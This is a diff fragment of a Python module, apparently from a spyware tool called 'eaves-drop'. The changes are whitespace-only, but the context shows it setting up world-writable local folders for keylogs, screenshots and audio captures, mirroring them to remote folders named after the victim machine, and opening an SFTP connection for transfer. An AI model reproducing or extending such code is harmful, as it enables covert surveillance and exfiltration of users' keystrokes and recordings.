@@ -7,11 +7,10 @@ log_path = Path('./eaves-drop.log')
 logging.basicConfig(filename=log_path, level=logging.DEBUG)
 
 
-
 # global
 local_dir = Path('/tmp/eaves-drop')
 
-#remote
+# remote
 remote_dir = Path('/root/{node}-{system}'.format(node=system_info.node, system=system_info.system))
 
 
@@ -20,7 +19,6 @@ local_keylogs_dir = local_dir / 'keylogs'
 local_keylogs_dir.mkdir(0o777, parents=True, exist_ok=True)
 remote_dir = Path('/root/{node}-{system}'.format(node=system_info.node, system=system_info.system))
 remote_keylogs_dir = remote_dir / 'keylogs'
-
 
 # screenshots
 remote_screenshots_dir = remote_dir / 'screenshots'
@@ -31,7 +29,6 @@ local_screenshots_dir.mkdir(0o777, parents=True, exist_ok=True)
 remote_audios_dir = remote_dir / 'audios'
 local_audios_dir = local_dir / 'audios'
 local_audios_dir.mkdir(0o777, parents=True, exist_ok=True)
-
 
 sftp_server = sftp_server()
 
